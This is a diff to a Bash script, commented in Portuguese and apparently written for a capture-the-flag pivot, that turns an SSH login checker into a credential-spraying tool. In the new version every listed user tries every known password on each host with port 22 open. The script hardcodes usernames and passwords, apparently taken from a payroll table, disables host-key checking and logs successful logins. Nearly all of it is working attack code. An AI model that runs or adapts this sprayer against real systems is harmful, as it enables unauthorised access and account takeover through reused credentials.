@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
-# Varredura SSH em varios hosts com pares user:pass (payroll + extras).
-# Pensado para pivot CTF onde ja tens credenciais em claro (user.txt / ssh.sh).
+# Varredura SSH: em cada host com :22, RODIZIO — cada utilizador tenta TODAS as senhas
+# conhecidas, so depois o seguinte utilizador (maximiza reutilizacao por conta).
+# CREDS_FILE (opcional) acrescenta pares user:pass exactos no fim de cada host.
 #
 # Uso:
 #   bash ssh_sweep.sh
@@ -15,8 +16,11 @@
 #   SSH_REMOTE_CMD   (default: whoami)  — comando nao-interactivo apos auth
 #   STOP_ON_HIT      (default: 0)       — 1 = para no primeiro sucesso global
 #   SKIP_PORT_CHECK  (default: 0)     — 1 = nao testa /dev/tcp/22 antes
+#   VERBOSE          (default: 0)     — 1 = mostra ultimas linhas do ssh em falhas
 #   HOSTS_FILE       ficheiro: um host por linha (# comenta)
 #   CREDS_FILE       ficheiro: linhas user:pass (# comenta; : no user raro)
+#   SPRAY_USERS      utilizadores extra (virgula); default nick-server (.TODO leonard).
+#                    SPRAY_USERS=- nao acrescenta ninguem alem da lista base.
 
 set -uo pipefail
 
@@ -24,7 +28,16 @@ CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-6}"
 SSH_REMOTE_CMD="${SSH_REMOTE_CMD:-whoami}"
 STOP_ON_HIT="${STOP_ON_HIT:-0}"
 SKIP_PORT_CHECK="${SKIP_PORT_CHECK:-0}"
+VERBOSE="${VERBOSE:-0}"
 LOG_FILE="${LOG_FILE:-/tmp/ssh_sweep_$(date +%Y%m%d_%H%M%S).log}"
+
+# Opcoes comuns (muitos Ubuntu exigem keyboard-interactive em vez de "password" puro)
+_ssh_client_opts() {
+  printf '%s' "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+-o PreferredAuthentications=password,keyboard-interactive \
+-o PubkeyAuthentication=no -o IdentitiesOnly=yes \
+-o NumberOfPasswordPrompts=1 -o ConnectTimeout=${CONNECT_TIMEOUT}"
+}
 
 _resolve_ssh_bin() {
   if [[ -n "${SSH_BIN:-}" && -x "${SSH_BIN}" ]]; then
@@ -45,18 +58,55 @@ _resolve_ssh_bin() {
 
 SSH_BIN="$(_resolve_ssh_bin)" || exit 1
 
-# Pares 1:1 (tabela payroll + reutilizacao tipica SSH/MySQL)
-declare -a PAIRS=(
-  "nickj:ZeqlcR2!4gN"
-  "leonardz:averylongpasswordfornohackertodiscover"
-  "anneh:VSZ785-aWB15#q"
-  "joaos:F147-0356agipV"
-  "joshuaa:QW5al7oPN2-1"
-  "jonasf:minecraft123"
-  "dmitrip:42W#wskb-62wA\$sc"
-  "root:pujkFGC471-2j"
-  "ubuntu:ZeqlcR2!4gN"
+# Ordem do rodizio: payroll + contas tipicas SSH + extras (nick-server / SPRAY_USERS)
+declare -a SSH_USERS=(
+  "nickj"
+  "leonardz"
+  "anneh"
+  "joaos"
+  "joshuaa"
+  "jonasf"
+  "dmitrip"
+  "root"
+  "ubuntu"
 )
+
+# Todas as senhas do inventario (cada SSH_USER tenta cada uma, por host).
+declare -a SSH_PASSWORDS=(
+  "ZeqlcR2!4gN"
+  "averylongpasswordfornohackertodiscover"
+  "VSZ785-aWB15#q"
+  "F147-0356agipV"
+  "QW5al7oPN2-1"
+  "minecraft123"
+  "42W#wskb-62wA\$sc"
+  "pujkFGC471-2j"
+)
+
+declare -a CREDS_PAIRS=()
+
+_append_spray_users() {
+  local spray_raw="${SPRAY_USERS:-nick-server}"
+  [[ "${spray_raw}" == "-" ]] && return 0
+  local u _ifs_old spray_list seen
+  _ifs_old="${IFS}"
+  IFS=,
+  # shellcheck disable=SC2206
+  spray_list=(${spray_raw})
+  IFS="${_ifs_old}"
+  for u in "${spray_list[@]}"; do
+    u="${u//[[:space:]]/}"
+    [[ -z "${u}" ]] && continue
+    seen=0
+    for x in "${SSH_USERS[@]}"; do
+      [[ "${x}" == "${u}" ]] && { seen=1; break; }
+    done
+    [[ "${seen}" -eq 1 ]] && continue
+    SSH_USERS+=("${u}")
+  done
+}
+
+_append_spray_users
 
 _load_creds_file() {
   local f="${1:-}"
@@ -64,7 +114,7 @@ _load_creds_file() {
   while IFS= read -r line || [[ -n "${line}" ]]; do
     [[ -z "${line}" || "${line}" =~ ^[[:space:]]*# ]] && continue
     [[ "${line}" == *:* ]] || continue
-    PAIRS+=("${line}")
+    CREDS_PAIRS+=("${line}")
   done <"${f}"
 }
 
@@ -121,9 +171,10 @@ _pick_ssh_method() {
 
 _try_pair() {
   local host="$1" user="$2" pass="$3"
-  local attempt_log rc
+  local attempt_log rc ssh_opts
+  ssh_opts="$(_ssh_client_opts)"
 
-  attempt_log="/tmp/.ssh_sweep_${host//./_}_${user}_$$.log"
+  attempt_log="/tmp/.ssh_sweep_${host//./_}_${user}_$$_${RANDOM}.log"
   : >"${attempt_log}"
 
   if [[ "${SSH_METHOD}" == "manual" ]]; then
@@ -139,21 +190,15 @@ _try_pair() {
 
   set +e
   if [[ "${SSH_METHOD}" == "sshpass" ]]; then
-    script -q -c "SSHPASS='${pass}' sshpass -e '${SSH_BIN}' \
-      -o StrictHostKeyChecking=no \
-      -o UserKnownHostsFile=/dev/null \
-      -o PreferredAuthentications=password \
-      -o PubkeyAuthentication=no \
-      -o ConnectTimeout=${CONNECT_TIMEOUT} \
-      -o NumberOfPasswordPrompts=1 \
-      '${user}@${host}' '${SSH_REMOTE_CMD}'" /dev/null >"${attempt_log}" 2>&1
+    script -q -c "SSHPASS='${pass}' sshpass -e '${SSH_BIN}' ${ssh_opts} '${user}@${host}' '${SSH_REMOTE_CMD}'" /dev/null >"${attempt_log}" 2>&1
     rc=$?
   elif [[ "${SSH_METHOD}" == "expect" ]]; then
     script -q -c "expect -c '
       set timeout $((CONNECT_TIMEOUT + 4))
-      spawn ${SSH_BIN} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=${CONNECT_TIMEOUT} ${user}@${host} ${SSH_REMOTE_CMD}
+      spawn ${SSH_BIN} ${ssh_opts} ${user}@${host} ${SSH_REMOTE_CMD}
       expect {
-        -re \"(?i)assword:\" { send \"${pass}\r\"; exp_continue }
+        -re \"(?i)(password|passphrase):\" { send \"${pass}\r\"; exp_continue }
+        -re \"(?i)password for\" { send \"${pass}\r\"; exp_continue }
         -re \"Permission denied\" { exit 2 }
         eof
       }
@@ -161,30 +206,25 @@ _try_pair() {
     rc=$?
   else
     local askpass_script
-    askpass_script="/tmp/.askpass_sweep_${host//./_}_${user}_$$.sh"
+    askpass_script="/tmp/.askpass_sweep_${host//./_}_${user}_$$_${RANDOM}.sh"
     cat >"${askpass_script}" <<EOF
 #!/usr/bin/env bash
 printf '%s\n' '${pass}'
 EOF
     chmod 700 "${askpass_script}"
-    DISPLAY=:0 SSH_ASKPASS="${askpass_script}" SSH_ASKPASS_REQUIRE=force \
-      setsid "${SSH_BIN}" \
-        -o StrictHostKeyChecking=no \
-        -o UserKnownHostsFile=/dev/null \
-        -o PreferredAuthentications=password \
-        -o PubkeyAuthentication=no \
-        -o NumberOfPasswordPrompts=1 \
-        -o ConnectTimeout="${CONNECT_TIMEOUT}" \
+    DISPLAY="${DISPLAY:-:0}" SSH_ASKPASS="${askpass_script}" SSH_ASKPASS_REQUIRE=force \
+      setsid "${SSH_BIN}" ${ssh_opts} \
         "${user}@${host}" "${SSH_REMOTE_CMD}" >"${attempt_log}" 2>&1
     rc=$?
     rm -f "${askpass_script}"
   fi
 
-  if grep -qi "Permission denied" "${attempt_log}" 2>/dev/null; then
+  if grep -qiE 'Permission denied|Too many authentication failures|Authentication failed' "${attempt_log}" 2>/dev/null; then
+    [[ "${VERBOSE}" == "1" ]] && { echo "[v] ${user}@${host} (negado) rc=${rc}:" | tee -a "${LOG_FILE}"; tail -6 "${attempt_log}" | tee -a "${LOG_FILE}"; }
     rm -f "${attempt_log}"
     return 1
   fi
-  if [[ ${rc} -eq 0 ]] && ! grep -qi "Permission denied" "${attempt_log}" 2>/dev/null; then
+  if [[ ${rc} -eq 0 ]] && ! grep -qiE 'Permission denied|Too many authentication failures' "${attempt_log}" 2>/dev/null; then
     echo "[+] SUCESSO ${user}@${host}  (rc=0)" | tee -a "${LOG_FILE}"
     echo "--- saida ---" | tee -a "${LOG_FILE}"
     tee -a "${LOG_FILE}" <"${attempt_log}"
@@ -192,6 +232,10 @@ EOF
     rm -f "${attempt_log}"
     return 0
   fi
+  [[ "${VERBOSE}" == "1" ]] && {
+    echo "[v] ${user}@${host} inconclusivo rc=${rc}:" | tee -a "${LOG_FILE}"
+    tail -12 "${attempt_log}" | tee -a "${LOG_FILE}"
+  }
   rm -f "${attempt_log}"
   return 1
 }
@@ -208,7 +252,8 @@ main() {
     echo "[*] SSH_BIN=${SSH_BIN}"
     echo "[*] Metodo=${SSH_METHOD}"
     echo "[*] Hosts (${#HOSTS[@]}): ${HOSTS[*]}"
-    echo "[*] Pares (${#PAIRS[@]}) + CREDS_FILE=${CREDS_FILE:-}"
+    echo "[*] Rodizio: ${#SSH_USERS[@]} users x ${#SSH_PASSWORDS[@]} senhas | CREDS_FILE: +${#CREDS_PAIRS[@]} pares (${CREDS_FILE:-nenhum})"
+    echo "[*] Users: ${SSH_USERS[*]}"
     echo "[*] Log=${LOG_FILE}"
     echo ""
   } | tee -a "${LOG_FILE}"
@@ -221,20 +266,37 @@ main() {
       echo "[.] ${host}:22 fechado ou sem resposta (skip)" | tee -a "${LOG_FILE}"
       continue
     fi
-    echo "[+] ${host}:22 aberto — a testar ${#PAIRS[@]} pares" | tee -a "${LOG_FILE}"
-    for pair in "${PAIRS[@]}"; do
-      user="${pair%%:*}"
-      pass="${pair#*:}"
-      if _try_pair "${host}" "${user}" "${pass}"; then
-        ok_any=1
-        [[ "${STOP_ON_HIT}" == "1" ]] && {
-          echo "[*] STOP_ON_HIT=1 — a terminar." | tee -a "${LOG_FILE}"
-          exit 0
-        }
-      else
-        echo "[-] falhou ${user}@${host}" | tee -a "${LOG_FILE}"
-      fi
+    echo "[+] ${host}:22 aberto — rodizio + creds" | tee -a "${LOG_FILE}"
+    for user in "${SSH_USERS[@]}"; do
+      echo "[*]   user ${user} (${#SSH_PASSWORDS[@]} senhas) ..." | tee -a "${LOG_FILE}"
+      for pass in "${SSH_PASSWORDS[@]}"; do
+        if _try_pair "${host}" "${user}" "${pass}"; then
+          ok_any=1
+          [[ "${STOP_ON_HIT}" == "1" ]] && {
+            echo "[*] STOP_ON_HIT=1 — a terminar." | tee -a "${LOG_FILE}"
+            exit 0
+          }
+        else
+          echo "[-]     falhou ${user}@${host}" | tee -a "${LOG_FILE}"
+        fi
+      done
     done
+    if [[ ${#CREDS_PAIRS[@]} -gt 0 ]]; then
+      echo "[*]   CREDS_FILE (${#CREDS_PAIRS[@]} pares) ..." | tee -a "${LOG_FILE}"
+      for pair in "${CREDS_PAIRS[@]}"; do
+        user="${pair%%:*}"
+        pass="${pair#*:}"
+        if _try_pair "${host}" "${user}" "${pass}"; then
+          ok_any=1
+          [[ "${STOP_ON_HIT}" == "1" ]] && {
+            echo "[*] STOP_ON_HIT=1 — a terminar." | tee -a "${LOG_FILE}"
+            exit 0
+          }
+        else
+          echo "[-]     falhou ${user}@${host}" | tee -a "${LOG_FILE}"
+        fi
+      done
+    fi
     echo "" | tee -a "${LOG_FILE}"
   done
 
